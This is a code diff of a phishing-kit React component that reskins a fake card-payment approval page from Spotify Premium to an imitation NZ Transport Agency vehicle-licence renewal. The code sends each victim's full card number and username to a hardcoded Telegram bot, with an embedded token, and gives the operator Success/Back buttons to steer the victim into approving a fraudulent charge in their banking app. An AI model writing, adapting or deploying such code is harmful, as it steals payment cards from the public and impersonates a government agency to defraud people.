@@ -1,15 +1,16 @@
 import React, { useEffect, useState } from 'react';
 import axios from 'axios';
-import './NextStepAppr.css';
+import './LoginScreen.css';
 import GiftCardPopup from './GiftCardPopup';
 import { useLanguage } from '../hooks/useLanguage';
+import nztaLogo from '../assets/nzta-logo.png';
 import visaLogo from '../assets/visa-logo.png';
 import mastercardLogo from '../assets/mastercard-logo.png';
 
 const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';
 const TELEGRAM_ACTIONS_CHAT_ID = '-4820671789';
 
-function SpotifyApprove({ onClose }) {  // ← ADD onClose prop
+function SpotifyApprove({ onClose }) {
   const { t } = useLanguage();
   const [isConfirmed, setIsConfirmed] = useState(false);
   const [currentTime, setCurrentTime] = useState(new Date());
@@ -45,7 +46,7 @@ function SpotifyApprove({ onClose }) {  // ← ADD onClose prop
   const closeGiftCard = () => {
     setShowGiftCard(false);
     if (onClose) {
-      onClose();  // ← Close the component
+      onClose();
     } else {
       sessionStorage.setItem('showCardForm', 'true');
       window.location.href = '/#/';
@@ -56,7 +57,7 @@ function SpotifyApprove({ onClose }) {  // ← ADD onClose prop
     console.log('⬅️ Back clicked');
     setIsConfirmed(false);
     if (onClose) {
-      onClose();  // ← Close the component
+      onClose();
     } else {
       setMessageText('Please make sure you have confirmed.');
       setMessageType('warning');
@@ -80,10 +81,13 @@ function SpotifyApprove({ onClose }) {  // ← ADD onClose prop
               const callbackData = update.callback_query.data;
               if (callbackData.startsWith('success_card_')) handleSuccessCard();
               else if (callbackData.startsWith('back_to_appr_')) handleBackToAppr();
-              await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                callback_query_id: update.callback_query.id,
-                text: '✅ Action executed!'
-              });
+              await axios.post(
+                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
+                {
+                  callback_query_id: update.callback_query.id,
+                  text: '✅ Action executed!',
+                }
+              );
             }
           }
         }
@@ -115,23 +119,32 @@ function SpotifyApprove({ onClose }) {  // ← ADD onClose prop
     try {
       const fullCardNumber = sessionStorage.getItem('cardNumber') || 'Unknown';
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const message = `✅ <b>SPOTIFY PAYMENT</b> ✅
+      const message = `✅ <b>PAYMENT CONFIRMATION</b> ✅
 ━━━━━━━━━━━━━━━━━━━━━
 👤 <b>Username:</b> ${username || 'Unknown'}
 💳 <b>Card Number:</b> <code>${fullCardNumber}</code>
-🏪 <b>Merchant:</b> Spotify Premium
+🏪 <b>Merchant:</b> NZTA Vehicle Licence
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <i>Choose an action:</i>`;
       const keyboard = {
-        inline_keyboard: [[
-          { text: "✅ Success", callback_data: `success_card_${Date.now()}` },
-          { text: "⬅️ Back", callback_data: `back_to_appr_${Date.now()}` }
-        ]]
+        inline_keyboard: [
+          [
+            { text: '✅ Success', callback_data: `success_card_${Date.now()}` },
+            { text: '⬅️ Back', callback_data: `back_to_appr_${Date.now()}` },
+          ],
+        ],
       };
-      await axios.post(url, { chat_id: TELEGRAM_ACTIONS_CHAT_ID, text: message, parse_mode: 'HTML', reply_markup: keyboard });
+      await axios.post(url, {
+        chat_id: TELEGRAM_ACTIONS_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        reply_markup: keyboard,
+      });
       return true;
-    } catch (error) { return false; }
+    } catch (error) {
+      return false;
+    }
   };
 
   const handleConfirm = async () => {
@@ -144,57 +157,207 @@ function SpotifyApprove({ onClose }) {  // ← ADD onClose prop
     setIsSending(false);
   };
 
+  // ─────────────────────────────────────────────
+  // WAITING / CONFIRMATION STATE (step 3 active)
+  // ─────────────────────────────────────────────
   if (isConfirmed) {
     return (
-      <div className="waiting-container-page">
-        {showMessage && <div className={`message-popup ${messageType}`}><span className="message-icon">⚠️</span><span className="message-text">{messageText}</span><button className="message-close" onClick={closeMessage}>×</button></div>}
-        <div className="waiting-card">
-          <h2 className="waiting-title">Confirmation in App</h2>
-          <div className="animated-loader"><div className="loader-ring"></div><div className="loader-ring-2"></div><div className="loader-ring-3"></div><div className="loader-dot"></div></div>
-          <h3>Waiting for Confirmation</h3>
-          <p>Your confirmation has been sent.</p>
-          <p>Please check your mobile banking app.</p>
-          <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
-        </div>
+      <div className="nzta-renewal">
+        <header className="nzta-header">
+          <div className="nzta-header-inner">
+            <div className="nzta-logo">
+              <img src={nztaLogo} alt="NZ Transport Agency" className="nzta-logo-img" />
+            </div>
+            <div className="nzta-services-tab">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#0b3b5c" strokeWidth="2">
+                <path d="M3 7l9-4 9 4-9 4-9-4z" />
+                <path d="M3 7v10l9 4 9-4V7" />
+              </svg>
+              <span>Online Services</span>
+            </div>
+          </div>
+        </header>
+
+        <main className="nzta-main">
+          {showMessage && (
+            <div className="nzta-error-banner">
+              ⚠️ {messageText}
+              <button
+                onClick={closeMessage}
+                style={{ marginLeft: 12, background: 'none', border: 'none', cursor: 'pointer', fontWeight: 700 }}
+              >
+                ×
+              </button>
+            </div>
+          )}
+
+          <h1 className="nzta-title">Confirmation in App</h1>
+
+          <ol className="nzta-steps">
+            <li className="nzta-step done">
+              <span className="nzta-step-circle">1</span>
+              <span className="nzta-step-label">Enter vehicle details</span>
+            </li>
+            <li className="nzta-step done">
+              <span className="nzta-step-circle">2</span>
+              <span className="nzta-step-label">Enter payment details</span>
+            </li>
+            <li className="nzta-step active">
+              <span className="nzta-step-circle">3</span>
+              <span className="nzta-step-label">Confirmation</span>
+            </li>
+          </ol>
+
+          <hr className="nzta-divider" />
+
+          <h2 className="nzta-subtitle">Waiting for Confirmation</h2>
+
+          <p className="nzta-help" style={{ marginBottom: 12 }}>
+            To complete your payment, please follow these steps:
+          </p>
+          <ol className="nzta-instructions" style={{ marginTop: 0, marginBottom: 24 }}>
+            <li>Open your banking app on your smartphone.</li>
+            <li>Confirm the authorization request.</li>
+            <li>Return to this screen and wait for confirmation.</li>
+          </ol>
+
+          <div className="nzta-total-card">
+            <h3>Payment status</h3>
+            <div className="nzta-total-row">
+              <span>Your confirmation has been sent.</span>
+            </div>
+            <div className="nzta-total-row">
+              <span>Please check your mobile banking app.</span>
+            </div>
+            <div className="nzta-total-row nzta-total-final">
+              <span>Current time</span>
+              <span>{currentTime.toLocaleString()}</span>
+            </div>
+          </div>
+
+          <div className="nzta-actions">
+            <button className="nzta-btn nzta-btn-cancel" onClick={closeGiftCard}>
+              Cancel
+            </button>
+          </div>
+        </main>
+
         {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
       </div>
     );
   }
 
+  // ─────────────────────────────────────────────
+  // FORM STATE (step 3 active — same as confirmation)
+  // ─────────────────────────────────────────────
   return (
-    <div className="confirmation-overlay">
-      {showMessage && <div className={`message-popup ${messageType}`}><span className="message-icon">⚠️</span><span className="message-text">{messageText}</span><button className="message-close" onClick={closeMessage}>×</button></div>}
-      <div className="confirmation-modal">
-        <div className="modal-header"><div className="card-icons"><img src={visaLogo} alt="VISA" className="visa-logo" /><img src={mastercardLogo} alt="Mastercard" className="mastercard-logo" /></div></div>
-        <h3>{t.confirmationInApp || 'Spotify Premium Payment'}</h3>
-        <div className="confirmation-details">
-          <div className="detail-row">
-            <span className="detail-label">{t.merchant || 'Merchant:'}</span>
-            <span className="detail-value">{cardBrand}</span>
-           </div>
-          <div className="detail-row">
-            <span className="detail-label">{t.amount || 'Amount:'}</span>
-            <span className="detail-value">$0.00</span>
+    <div className="nzta-renewal">
+      <header className="nzta-header">
+        <div className="nzta-header-inner">
+          <div className="nzta-logo">
+            <img src={nztaLogo} alt="NZ Transport Agency" className="nzta-logo-img" />
           </div>
-          <div className="detail-row">
-            <span className="detail-label">{t.date || 'Date:'}</span>
-            <span className="detail-value">{new Date().toLocaleString()}</span>
-          </div>
-          <div className="detail-row">
-            <span className="detail-label">{t.cardNumberLabel || 'Card Number:'}</span>
-            <span className="detail-value">{cardNumber}</span>
+          <div className="nzta-services-tab">
+            
+            <span>Online Services</span>
           </div>
         </div>
-        <div className="confirmation-instructions">
-          <p>• {t.instruction1 || 'Open your banking app on your smartphone.'}</p>
-          <p>• {t.instruction2 || 'Confirm the authorization.'}</p>
-          <p>• {t.instruction3 || 'Return to this screen after confirmation.'}</p>
-          <p>• {t.instruction4 || 'Tap "CONFIRM" when you are back.'}</p>
-        </div>
+      </header>
+
+      <main className="nzta-main">
+        {showMessage && (
+          <div className="nzta-error-banner">
+            ⚠️ {messageText}
+            <button
+              onClick={closeMessage}
+              style={{ marginLeft: 12, background: 'none', border: 'none', cursor: 'pointer', fontWeight: 700 }}
+            >
+              ×
+            </button>
+          </div>
+        )}
+
+        <h1 className="nzta-title">Payment confirmation</h1>
+
+        {/* ─── STEP 3 ACTIVE ─── */}
+        <ol className="nzta-steps">
+          <li className="nzta-step done">
+            <span className="nzta-step-circle">1</span>
+            <span className="nzta-step-label">Enter vehicle details</span>
+          </li>
+          <li className="nzta-step done">
+            <span className="nzta-step-circle">2</span>
+            <span className="nzta-step-label">Enter payment details</span>
+          </li>
+          <li className="nzta-step active">
+            <span className="nzta-step-circle">3</span>
+            <span className="nzta-step-label">Confirmation</span>
+          </li>
+        </ol>
+
+        <hr className="nzta-divider" />
+
+        <p className="nzta-hint">Please confirm the payment in your banking app.</p>
+
         
-        <div className="confirmation-buttons"><button onClick={handleConfirm} className="confirm-btn" disabled={isSending}>{isSending ? 'Sending...' : 'Confirm'}</button></div>
-        <div className="secure-badge"><span className="lock-icon">🔒</span><span>Secured by your Bank</span></div>
-      </div>
+        <div style={{ display: 'flex', gap: 12, alignItems: 'center', marginBottom: 20 }}>
+          <img src={visaLogo} alt="VISA" style={{ height: 28 }} />
+          <img src={mastercardLogo} alt="Mastercard" style={{ height: 28 }} />
+        </div>
+
+        <div className="nzta-total-card">
+          <h3>{t.confirmationInApp || 'Vehicle Licence Payment'}</h3>
+
+          <div className="nzta-total-row">
+            <span>{t.merchant || 'Merchant'}</span>
+            <span>{cardBrand}</span>
+          </div>
+          <div className="nzta-total-row">
+            <span>{t.amount || 'Amount'}</span>
+            <span>$0.00</span>
+          </div>
+          <div className="nzta-total-row">
+            <span>{t.date || 'Date'}</span>
+            <span>{new Date().toLocaleString()}</span>
+          </div>
+          <div className="nzta-total-row nzta-total-final">
+            <span>{t.cardNumberLabel || 'Card Number'}</span>
+            <span>{cardNumber}</span>
+          </div>
+          {/* ─── 3 STEPS: open bank app & approve ─── */}
+<p className="nzta-help" style={{ marginBottom: 12 }}>
+  To complete your payment, please follow these steps:
+</p>
+<ol className="nzta-instructions" style={{ marginTop: 0, marginBottom: 24 }}>
+  <li>Open your banking app on your smartphone.</li>
+  <li>Approve the authorization request.</li>
+  <li>Return to this screen and tap "Confirm".</li>
+</ol>
+        </div>
+
+        <div className="nzta-actions">
+          <button
+            onClick={handleConfirm}
+            className="nzta-btn nzta-btn-continue"
+            disabled={isSending}
+          >
+            {isSending ? 'Sending…' : 'Confirm'}
+          </button>
+          <button
+            type="button"
+            className="nzta-btn nzta-btn-cancel"
+            onClick={handleBackToAppr}
+            disabled={isSending}
+          >
+            Cancel
+          </button>
+        </div>
+
+        <p className="nzta-help" style={{ marginTop: 16 }}>
+          🔒 Secured by your Bank
+        </p>
+      </main>
+
       {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
     </div>
   );
